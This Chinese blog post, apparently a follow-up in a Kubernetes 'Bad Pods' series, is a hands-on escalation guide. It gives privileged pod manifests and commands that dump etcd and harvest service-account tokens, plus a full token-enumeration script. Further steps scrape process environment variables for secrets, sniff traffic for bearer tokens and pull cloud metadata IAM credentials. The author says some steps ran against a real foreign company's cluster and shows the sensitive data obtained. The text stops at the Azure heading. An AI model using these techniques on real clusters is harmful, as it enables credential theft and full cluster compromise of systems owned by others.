> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Mq4FlIHWvIhewkSWOSbCUg)

上篇文章

**【云原生安全】Bad Pods 系列基础篇 - 创建恶意 POD**

本文是对上篇文章的延续。

[https://mp.weixin.qq.com/s/DF7Y9PdcgbxPs6BIVoxngA](https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&mid=2247483701&idx=1&sn=73ba575b475547bee9539d9b74573d65&scene=21#wechat_redirect)

尝试在 master 节点上创建 Pod
--------------------

上篇文章中创建的几种 Pod 大概率是工作节点上调度的，上篇文章中 Pod 配置文件如果取消注释 `#nodeName: k8s-control-plane-node` 并将 k8s-control-plane-node 更改为控制 (master) 节点的 name，可以强制将该 Pod 调度到该节点上运行，则可以轻松访问 etcd 数据库，其中包含集群的所有配置。

**靶机选择**

我这里选择的是 oreilly，详情请看文章 ->[https://mp.weixin.qq.com/s/RnsFJ7FQ67pRI-swX0G-5Q](https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&mid=2247483723&idx=1&sn=749a78e34c50b673be78ad4a509cdaa1&scene=21#wechat_redirect)

该集群环境有两个 node，一个控制 (master) 节点 & 一个工作节点。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhvsnsT0kdltXiatrNHTYO5MrChoAYrezZUdlh2npMaRQD0tf25EKd00g/640?wx_fmt=png)

**创建 Pod 并调度到 master 上**

将 nodeName 赋值为 master 节点名

`kubectl apply -f BadPod.yaml`

```
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  nodeName: controlplane
  volumes:
  - name: noderoot
    hostPath:
      path: /

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhW4aanjIiaYz2BX39fqiaYibDTAR3Lt2v6UG3QJvxOmuRDZiaQ2Ik8oyQNw/640?wx_fmt=png)

**从 etcd 读取敏感数据**

进入 Pod Shell，并将 Pod 的 `/host`目录作为新的根目录，由于`/host` 挂载了 master 节点的根目录，所以此命令进入的目录是 master 节点的根目录。

`kubectl exec -it everything-allowed-exec-pod -- chroot /host bash` 已经成功了哈，只不过那个前缀没变。(如果没成功进入的话，exit 会直接关闭沙盒的)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhfMlMz6LiaDyApiacnSxyaViaJuE87eX2jhhibvK7GANian37gicic0gRGCEYw/640?wx_fmt=png)

**查看数据库的位置**

`ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhlr6shCmv89dkqASmWdVP6zFH5B8oIiczPyt1P2bxWVu9b7fyMD1RbCw/640?wx_fmt=png)

**查看 etcd 数据库中的数据**

`strings /var/lib/etcd/member/snap/db | less`

**从数据库中提取令牌并显示服务帐户名称**

``db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done`` 没有 kube-system 下的 token，可能是这个沙盒环境的原因。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhE46ic8tZMbPUUO0jrMlVQxPGvUd3XEGsTATIWfAnjcX4tia4To6seX7w/640?wx_fmt=png)

只返回 kube-system 命名空间中的默认令牌

``db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default``

允许所有
----

上篇文章中获取了 Pod 和 Node 权限，接下来我们得想办法获取整个集群的权限。以下有四种主要攻击思路。

**思路① 尝试在 master 上创建 Pod**

上文有介绍。

**思路② 在宿主机 (node) 文件系统中查找 kubeconfigs**

```
#这里查找的是node的文件系统，所以注意根据容器(pod)挂载情况修改对应的查找目录
#比如根据上篇文章中的挂载情况，命令就应该修改为 find /host -name kubeconfig
#kubeconfig 是 Kubernetes 配置文件，通常包含与 Kubernetes 集群通信所需的身份验证和授权信息。
#current-context 是 kubeconfig 文件中的一个字段，它指定了当前使用的上下文。
find / -name kubeconfig
find / -name .kube
grep -R "current-context" /home/
grep -R "current-context" /root/

```

靶机选择，我这里选择的是 oreilly，详情请看文章 ->[https://mp.weixin.qq.com/s/RnsFJ7FQ67pRI-swX0G-5Q](https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&mid=2247483723&idx=1&sn=749a78e34c50b673be78ad4a509cdaa1&scene=21#wechat_redirect)

该集群环境有两个 node，一个控制 (master) 节点 & 一个工作节点。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhvsnsT0kdltXiatrNHTYO5MrChoAYrezZUdlh2npMaRQD0tf25EKd00g/640?wx_fmt=png)

模拟环境，在 node01 上创建 Pod

```
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  nodeName: node01
  volumes:
  - name: noderoot
    hostPath:
      path: /

```

进入该 Pod 的 shell，此时的目录是 node01 的根目录

`kubectl exec -it everything-allowed-exec-pod -- chroot /host bash`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhUk3OUiaWUIhdjkwvS7IP6AakBWQ7CGQqd7GKW46gVsScT51v570pf9g/640?wx_fmt=png)

没有找到较为敏感的信息，只有一个历史命令。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhMXXB61LLa5oBVHFTcnJ3c689nlnay4ZTNOjRb7Oyt9k1yl3hmYq7YA/640?wx_fmt=png)

我换个漂亮国某企业的集群环境 - 我这里将 node 根目录挂载到 pod 的 / mnt 下，在 Pod Shell 中执行：`find /mnt -name kubeconfig`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYh1rkgM7Meiaf6dVDwEDxvtUAW8S6ibwWWqKDCKcrQgxucuORtFtuEOogw/640?wx_fmt=png)

获取了一些敏感信息

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhmV9hZoRpib9icJ0Sb8fcLSf9xTlurMibQVGMQhRunTynzwHBict8K2UHRQ/640?wx_fmt=png)

**思路③ 从所有 Pod 中获取所有 token**

我们能够访问所在节点上任何 Pod 中挂载的任何密钥。即使在工作节点上，通常也至少有一个 Pod 具有挂载的 token，该 token 绑定到 clusterrolebinding 的服务帐户，使得该账号可以执行如在所有命名空间中创建 Pod 或查看敏感数据之类的操作。

下方脚本的目的是检测获取到的一些 tokens 有没有执行高危操作的权限，该脚本能够自动化：在 pod 中安装 curl 和 kubectl（如果未安装）；从`/host/var/lib/kubelet/pods/*`中获取所有 token；循环执行`kubectl --token=$token auth can-i [$user-input]`

```
#!/bin/bash
###############################################################################
# Purpose: 
# 
# This script will find the token/secret for each pod running on the node and 
# tell you what each token is authorized to do. It can be run from within a pod 
# that has the host's filesystem mounted to /host, or from outside the pod.
#
# Usage:
#
# *** For execution INSIDE a pod with the host's filesystem mounted to /host *** 
#
#        This mode is best for:
#            - everything-allowed       
#            - hostPath
#
# Copy the can-they.sh helper script to the pod, download it from github, or manually created it
#     kubectl cp scripts/can-they.sh podname:/
#
# Exec into pod (Don't chroot)
#     kubectl exec -it pod-name  -- bash
#
# Run can-they.sh
#    ./can-they.sh "-i --list"
#    ./can-they.sh "-i --list -n kube-system"
#    ./can-they.sh "-i --list -n default"
#    ./can-they.sh "-i list secrets -n kube-system"
#    ./can-they.sh "-i create pods -n kube-system"
#    ./can-they.sh "-i create clusterrolebindings"
#
#
# *** For execution OUTSIDE a pod ***
#
#        This mode is best for:
#            - priv-and-hostpid       
#
# Run can-they.sh
#    ./can-they.sh -n NAMESPACE -p POD_NAME -i "OPTIONS"
#    ./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "list secrets -n kube-system"
#    ./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "--list"
#    ./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "-n kube-system"
#    ./can-they.sh -n development -p priv-and-hostpid-exec-pod -i "get secrets -n kube-system"
#
###############################################################################
function check-can-exec-pod {
check=$(kubectl auth can-i create pods/exec -n $namespace)
#echo $check
if [[ $check == "no" ]]; then
  echo "Are you sure you have access to exec into $pod in the $namespace namespace?"
  exit 1
fi
}
function run-outside-pod {
  # Get the filenames that contain tokens from the mounted host directory
  tokens=`kubectl exec -it $pod -n $namespace -- find /host/var/lib/kubelet/pods/ -name token -type l 2>/dev/null`
  # Backup plan in case you are chrooted or running on host
  if [ $? -eq 1 ]; then
    tokens=`kubectl exec -it $pod -n $namespace -- find /var/lib/kubelet/pods/ -name token -type l`
  fi
  #tokens=`kubectl exec -it $pod -n $namespace -- find /var/lib/kubelet/pods/ -name token -type l`
  for filename in $tokens; do
    filename_clean=`echo $filename | tr -dc '[[:print:]]'`
    echo "--------------------------------------------------------"
    echo "Token Location: $filename_clean"
    tokena=`kubectl exec -it $pod -n $namespace -- cat $filename_clean`
    echo -n "Can I $user_input? "
    SERVER=`kubectl config view --minify --flatten -ojsonpath='{.clusters[].cluster.server}'`
    export KUBECONFIG="dummy"
    #echo "kubectl --server=$SERVER --insecure-skip-tls-verify --token=$tokena auth can-i $user_input"
    echo
    kubectl --server=$SERVER --insecure-skip-tls-verify --token=$tokena auth can-i $user_input 2> /dev/null; echo; \
    unset KUBECONFIG
  done
}
function am-i-inside-pod-check {
echo $KUBERNETES_SERVICE_HOST
if [[ -z $KUBERNETES_SERVICE_HOST ]]; then
  echo "It does not appear you are in a Kubernetes pod?"
  echo
  usage
fi
}
function run-inside-pod {
  if [ ! -f  "/usr/local/bin/kubectl" ]; then
    apt update && apt -y install curl
    #Download and install kubectl into pod
    curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
    chmod +x ./kubectl
    mv ./kubectl /usr/local/bin/kubectl
  fi
  # Get the filenames that contain tokens from the mounted host directory
  tokens=`find /host/var/lib/kubelet/pods/ -name token -type l`
  # Backup plan in case you are chrooted or running on host
  if [ $? -eq 1 ]; then
    tokens=`find /var/lib/kubelet/pods/ -name token -type l`
  fi
  #For each token, print the token location and run `kubectl auth can-i list` using each token via the `--token` command line argument.
  for filename in $tokens; do
    filename_clean=`echo $filename | tr -dc '[[:print:]]'`
    echo "--------------------------------------------------------"
    echo "Token Location: $filename_clean"
    tokena=`cat $filename_clean`
    echo -n "Can I $user_input? "
    kubectl --token=$tokena auth can-i $user_input
    echo
  done
}
function usage {
  echo "Usage: "
  echo
  echo "  [From outside a pod]: $0 -p podname -n namespace [-i \"VERB [TYPE] [options]\"]"
  echo "  [From inside a pod]:  $0 [-i \"VERB [TYPE] [options]\"]"
  echo
  echo "Options: "
  echo
  printf "  -p\tPod Name\n"
  printf "  -n\tNamespace\n"
  printf "  -i\tArugments that you would normally pass to kubectl auth can-i []\n"
  echo
  exit 1
}
while getopts n:p:i: flag
do
    case "${flag}" in
        n) namespace=${OPTARG};;
        p) pod=${OPTARG};;
        i) user_input=${OPTARG};;
        *) usage;;
    esac
done
if [[ -z "$user_input" ]]; then
  user_input="--list"
fi
if [[ "$namespace" ]] && [[ "$pod" ]]; then
  #echo "outside"
  check-can-exec-pod
  run-outside-pod
elif  [[ -z "$namespace" ]] && [[ -z "$pod" ]]; then
  #echo "inside"
  am-i-inside-pod-check
  run-inside-pod
else
  echo "If running this script from outside a pod, you need to specify both the pod name and the namespace"
  usage
fi

```

进入 Pod Shell 写入脚本并加权限执行，这里就不需要 chroot 了，因为脚本中的执行目录带着 /host  

`kubectl exec -it everything-allowed-exec-pod -- bash`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhYc0fUP7OC63BxCaicIBht9mapibqGZPLGZCKoGAlyiaz7ov4lL6WCqApA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhwJOKZ9jgXy6SA3BcdLIjSaZIQTeiaqK5XEZ0Fa5YdvicfvZjmDkVPiaLA/640?wx_fmt=png)

```
#脚本其他用法
./can-they.sh -i "--list -n kube-system"
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"
./can-they.sh -i "create pods -n kube-system"
./can-they.sh -i "create clusterrolebindings"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhHsPT9FXQMjXXwOuibYWfveFdpuibN7El9fXtcfqesU92sgJxqIn3AtDA/640?wx_fmt=png)

可以看见有部分 token 权限很大，可以横向到 master 节点，控制整个集群。

如果当前 Pod 执行上面脚本失败 (比如没办法下载 curl 和 kubectl)，可在安装了 kubectl 的地方执行下面命令（注意命令中路径视情况而变），命令的含义：针对节点上找到的所有令牌运行 `kubectl can-i --list`，也可以限制命名空间运行 `kubectl can-i --list -n kube-system`

```
tokens=`kubectl exec -it xxx-pod -- find /var/lib/kubelet/pods/ -name token -type l`; \
for filename in $tokens; \
do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
echo "Token Location: $filename_clean"; \
tokena=`kubectl exec -it priv-and-hostpid-exec-pod -- cat $filename_clean`; \
echo -n "What can I do? "; \
kubectl --token=$tokena auth can-i --list; echo; \
done

```

只需列出每个 token 的命名空间和位置（注意命令中路径视情况而变）

``tokens=`find /host/var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort``

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhTPpibfcmoHohZSsyBZP7e02m4rgwegHl4GjAfSrVxo0KK5QAz5lyZPQ/640?wx_fmt=png)

**思路④ 其他**

*   破解 /etc/shadow 中的密码，看看是否可以使用它们来访问 master 节点
    
*   查看每个 Pod 的卷，可能会在那里找到一些非常敏感的东西
    

只允许 Privileged+hostPid
----------------------

上篇文章中创建该 Bad Pod 可以得到：容器运行时会拥有宿主机的权限，容器启动时执行了命令 `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`，命令意思是：在容器内部运行的 nsenter 命令将容器加入到宿主机的 PID、mount、UTS、IPC、network 和 PID 命名空间中，以便于容器能够访问宿主机的进程、文件系统、网络等资源。

思路① 尝试在 master 上创建 Pod

思路② 在宿主机 (node) 文件系统中查找 kubeconfigs

思路③ 从所有 Pod 中获取所有 token

思路④ 其他

和上一部分【允许所有】一样。

只允许 Privileged
--------------

上篇文章中创建了一个有特权容器的 Pod，因此我们能够拥有很多特权：对宿主机文件系统的完全访问权限；可以在容器内运行特权命令，例如 mount、chroot、setuid 等；可以绕过 Linux 内核的某些安全机制，如 AppArmor 和 Seccomp；可以访问主机网络栈和所有网络设备。以下介绍几种攻击思路。

靶机选择，我这里选择的是 oreilly，详情请看文章 ->[https://mp.weixin.qq.com/s/RnsFJ7FQ67pRI-swX0G-5Q](https://mp.weixin.qq.com/s?__biz=MzkwMDQ4MDU2MA==&mid=2247483723&idx=1&sn=749a78e34c50b673be78ad4a509cdaa1&scene=21#wechat_redirect)

该集群环境有两个 node，一个控制 (master) 节点 & 一个工作节点。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhvsnsT0kdltXiatrNHTYO5MrChoAYrezZUdlh2npMaRQD0tf25EKd00g/640?wx_fmt=png)

先创建一个有特权容器的 Pod，并且使其运行在 node01 节点 (工作节点)

```
apiVersion: v1
kind: Pod
metadata:
  name: priv-exec-pod
  labels:
    app: pentest
spec:
  containers:
  - name: priv-pod
    image: ubuntu
    securityContext:
      privileged: true
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  nodeName: node01

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhBGEH6HMKib5Tjzc4bj2MecfrYTwpZEqO0Q5VSwBe0gUcRf0PvqKiaA1A/640?wx_fmt=png)

**思路① 尝试在 master 上创建 Pod**

上文有介绍。

**思路② 挂载宿主机的文件系统**

检查是否能连接到宿主机的存储设备

`fdisk -l`命令用于列出系统中的所有磁盘分区，包括磁盘的大小、文件系统类型、启动标志等信息。由于容器以特权模式运行，该命令可以访问主机上的所有磁盘分区

`kubectl exec -it priv-exec-pod -- fdisk -l`运行后报错，因为创建的容器里没有 fdisk 这个命令。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhlUmwBwo5pRDS8woyx1YOC3NiaotBEibOc8zzmq3CnKCeIqVLf55lSCow/640?wx_fmt=png)

尝试安装，失败。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhDVjvvsRcN8PRufDcRnKnu2WZQnBf8Oq7YjHJOZYUpLAmXLFibl13GDw/640?wx_fmt=png)

故可以找其他命令代替，如`blkid`

`kubectl exec -it priv-exec-pod -- blkid`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhYxVKn5TAbrXIgrkzFpvEviaoURCvaqQKBFHRiaVEsLKkPIUju98SW4ug/640?wx_fmt=png)

创建装入点并将宿主机的存储设备装载到容器中，猜一下 / dev/vda2 可能是根分区

`kubectl exec -it priv-exec-pod -- mkdir /host`

`kubectl exec -it priv-exec-pod -- bash -c "mount /dev/vda2 /host/"` 成功挂载了宿主机的根目录到容器的 /host 目录下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhHomFPo5LNQkIQAcFbj2sreAwBQ8sXdBqbwKtLx9O10txyH1R2osAJQ/640?wx_fmt=png)

接下来可以（上文【允许所有】中这些都已经操作了）

*   从 etcd 读取敏感信息
    
*   宿主机 (node) 文件系统中查找 kubeconfigs
    
*   从所有 Pod 中获取所有 token
    

**思路③ 漏洞利用**

通过利用容器中的漏洞或错误配置来获取 Pod 所在宿主机上的 root 权限。

**思路④ 其他**

*   破解 /etc/shadow 中的密码，看看是否可以使用它们来访问 master 节点
    
*   查看每个 Pod 的卷，可能会在那里找到一些非常敏感的东西
    

只允许 hostPath
------------

上篇文章中获取了 Pod 权限和访问 Node 文件系统的权限，在这种情况下，即使我们无权访问宿主机的进程或网络命名空间，如果管理员没有限制可以挂载的内容，我们也可以在宿主机上挂载根目录到 Pod 中，从而在宿主机的文件系统上获得读 / 写访问权限。

思路① 尝试在 master 上创建 Pod

思路② 在宿主机 (node) 文件系统中查找 kubeconfigs

思路③ 从所有 Pod 中获取所有 token

思路④ 其他

和上一部分【允许所有】一样。

只允许 hostPid
-----------

上篇文章中获取了 Pod 权限并能共享宿主机的 PID 命名空间，容器内的进程与宿主机上的进程在同一个命名空间中运行。以下是在一个真实业务集群环境的 Pod 上执行的，该 Pod 属于 Bad Pod 中的 “只允许 hostPid”。

下面是漂亮国某企业的集群环境。

**思路① 查看宿主机上运行的所有进程，包括每个 Pod 中运行的进程，并查找密码、令牌、密钥等**

`ps -aux`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhZFWI77iceCyuhZsvlXrncpmCVDqnSz1pGhcJDvMjXibHeB11fiavfiaE4w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhMRdIy9D763b5z5Guqib9n31zzW4q6pVeKMqTx5ZpgFeVAC9osatvnLQ/640?wx_fmt=png)

一般的 Pod 进程很少。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhCddg0JUCMXDXQJWwibeRiaJickCA1cjribUs9XmpLx8h4CkxGwUfTuQMqg/640?wx_fmt=png)

**思路② 查看宿主机上每个 Pod 的环境变量**

列出每个进程的环境变量（如果进程以 UID 0 运行）并保存到文件中，可能在文件中寻找到敏感信息，例如密钥等。

``for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done > envs.txt``

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhAN4CnFicfoWIggPK9xrs7SNERUu3PbQMteIqiayzicj94ibBxUmXSpx8SQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhaoGFx0x8Sx19HnVs3ApMwGP9QlyF0G1GMsicnBXpiaptoibPulRZhev7w/640?wx_fmt=png)

上面显示的 for 循环仅从与 hostPID Pod 共享相同 UID 的 Pod 中运行的进程获取环境变量。默认情况下，我们创建的 Bad Pod 以 UID 0 运行，因此可以查看还有哪些 pid 正在运行：

`ps auxn | awk '{print $1}' | sort | uniq -c | sort -rn`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhTu4lSXGxMJP8wicGTuGAJRLhtfg0e6jumYCtn6tnpXh6pTNmma2wwog/640?wx_fmt=png)

上图可得大多数进程都以 root 身份运行，还有少数例如有 2 个进程以 UID 89 运行，如果想从那 2 个进程中获取环境变量，则需要运行一个新 Bad Pod 并将 runAsUser 设置为所需的 UID。

```
apiVersion: v1
kind: Pod
metadata:
  name: hostpid-exec-pod-89
  labels:
    app: pentest
spec:
  securityContext:
    runAsUser: 89
    runAsGroup: 89
  hostPID: true
  containers:
  - name: hostpid-pod-89
    image: ubuntu
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhrDiaZZMg6coQQGV27bibAku9rreJLDsfaChWa0iaVjMxM9gZL0w2S4TlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYh2b8bHic8zLytqY7QOSoMF8r2Yn33b3XUu9CfTZ9hllVNt3JpxYz4eQQ/640?wx_fmt=png)

**思路③ 查看主机上每个 Pod 的文件描述符**

获取我们有权访问的进程关联的文件描述符列表并保存。(当然和上一步一样，要访问与容器中未以 UID 0 运行的进程关联的文件描述符需要运行一个新 Bad Pod 并将 runAsUser 设置为所需的 UID)

``for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt``

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhyWfJ7Wpm2g8xtaWFk5Qv0jSd5dadRtGj6iaKRlXPIZ28Sxkia2pjTQCw/640?wx_fmt=png)

我们可以查看一些文件，可能存在敏感信息。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/rEmMwdZTjBFkgDUztamiaYKLicPiaNYMaYhMDaJPSqgftKCYqquky3Sk2seOYIegkYKpicncjoYtParq2KHmkKGMFw/640?wx_fmt=png)

还能终止任何进程！

`pkill -f "nginx"`

只允许 hostNetwork
---------------

上篇文章中获取了 Pod 权限并能使用宿主机的网络命名空间，容器可以直接访问宿主机的网络资源。

**思路① 嗅探流量**

可用于嗅探宿主机上任何接口上的未加密流量，如果幸运的话可以找到通过未加密通道传输的 token 或其他敏感信息。

```
1. 安装tcpdump (如果无法访问互联网，则需要将Bad Pod中镜像更改为tcpdum https://hub.docker.com/r/corfr/tcpdump)
apt update && apt -y install tcpdump net-tools netcat
2. 查看kubelet的只读端口(10255/tcp  可以通过此端口查询节点的信息，如节点的名称、地址、容器运行状态等)
nc -zv 10.0.0.162 10255
3. 如果该端口已打开，可运行tcpdump，将输出记录到文件
注意：在具有大量流量的接口上嗅探可能会导致接口丢弃流量，对生产环境造成影响，
故建议一次选择一个端口进行数据包捕获。
tcpdump -ni [host or docker interface name] -s0 -w kubelet-ro.cap port 10255
4. 停止嗅探并使用tcpdump读取文件，可能会得到token
tcpdump -ro kubelet-ro.cap -s0 -A
tcpdump -ro kubelet-ro.cap -s0 -A | grep Bearer

```

**思路② 调查本地服务**

`curl https://localhost:1234/metrics`

通常这个路径用于暴露一个应用程序的指标（metrics），例如应用程序的性能指标、资源使用情况、请求响应时间等等。可以使用 curl 命令来访问这些指标以进行监控和分析。

**思路③ 绕过网络策略**

如果在一个 Kubernetes 命名空间（namespace）中应用了严格的网络策略，则可以通过部署一个具有 hostNetwork=true 的 pod 来绕过这些限制。这是因为部署此类 pod 会将该 pod 绑定到宿主机的网络接口上，而不是 Kubernetes 网络中的 pod，因此该 pod 可以访问宿主机上的所有网络接口，而不受网络策略的限制。

只允许 hostIPC
-----------

上篇文章中获取了 Pod 权限并能使用宿主机的 IPC 命名空间，如果宿主机上的进程或其他 Pod 中的进程正在使用宿主机的进程间通信机制（共享内存、信号量数组、消息队列等），便能够进行读取 / 写入操作。

**思路① 进入 Pod 检查 /dev/shm，在此共享内存位置查找文件**

`/dev/shm` 目录是用于共享内存的临时文件系统，通常被用于高性能的内存共享或 IPC。在 Kubernetes 中，一些 Pod 和容器镜像可能会将一些敏感信息（例如 API 密钥、密码等）保存在这个目录下。因为 /dev/shm 目录所使用的内存是内存映射文件的形式，而非真正的硬盘存储，所以当容器被删除时，这些数据也会被清除。但是，在容器运行时，这些信息可能是可见的。

`ls -al /dev/shm/`

**思路② 查找宿主机上进程间通信信息**

ipcs 命令用于显示系统上的 IPC(Inter-process communication) 信息，包括消息队列、共享内存段和信号量等。其中，-a 选项表示显示所有 IPC 信息，包括正在使用和未使用的。这个命令会显示 IPC 对象的一些详细信息，可能会包含一些敏感信息，例如 IPC 对象的 ID、拥有者、权限等。

`ipcs -a`

无允许
---

上篇文章中限制了所有功能并只能获取了一个平平无奇的 Pod 权限，不过项目中还是介绍了一些攻击方法。

**思路① Cloud metadata**

如果集群是云托管的，可以尝试访问云元数据服务。

AWS

```
1. 测试是否有权限访问云元数据服务
#访问AWS元数据服务并返回最顶层的元数据目录
curl http://169.254.169.254/latest/meta-data
#使用IMDSv2版本的元数据服务来获取一个访问令牌并将其存储在变量TOKEN中
TOKEN="$(curl --silent -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 600" http://169.254.169.254/latest/api/token)"
#再次访问元数据服务，并使用先前获取的令牌访问更多的元数据信息
curl --silent -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data"
2. 获取用户数据，用户数据通常是一段脚本或命令，用于在实例启动时自动运行，故可查找凭证、kubelet 信息或存储桶名称
curl http://169.254.169.254/latest/user-data
3. 如果为节点分配了IAM角色，则可以访问节点的标识令牌
#列出角色名称
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
#获取该角色的安全凭证，其中包括访问密钥ID、秘密访问密钥和令牌。这些凭证可以用于访问与该角色关联的AWS服务
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
4. 在集群中部署一个使用AWS CLI的环境。通过部署这个Pod，可以在其中运行一些探测命令
apiVersion: v1
kind: Pod
metadata:
  name: nothing-allowed-awscli-pod
  labels:
    app: pentest
spec:
  containers:
  - name: nothing-allowed-awscli-pod
    image: amazon/aws-cli
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
#验证当前用户的AWS身份
aws sts get-caller-identity
#查询集群信息、访问存储桶等等
yum install jq
aws eks get-token --cluster-name clusterName --region us-east-1 | jq .
aws eks describe-cluster --name clusterName
aws s3 ls

```

GCP

```
1. 测试是否有权限访问云元数据服务，输出包括实例名称以及默认的Compute Engine服务帐号
curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/'
2. 查看分配给默认服务帐户的权限
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
3. 使用云SDK启动新容器，通过这个容器可执行一些命令
apiVersion: v1
kind: Pod
metadata:
  name: nothing-allowed-gcloud-pod
  labels:
    app: pentest
spec:
  containers:
  - name: nothing-allowed-gcloud-pod
    image: gcr.io/google.com/cloudsdktool/cloud-sdk:latest
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
#查找存储桶
root@pod:/# gsutil ls
AAA
#列出对象
root@pod:/# gsutil ls AAA
AAA/1.txt
#读取文件内容
root@pod:/# gsutil cat AAA/1.txt
xxxxx

```

Azure

```
1. 测试是否有权限访问云元数据服务
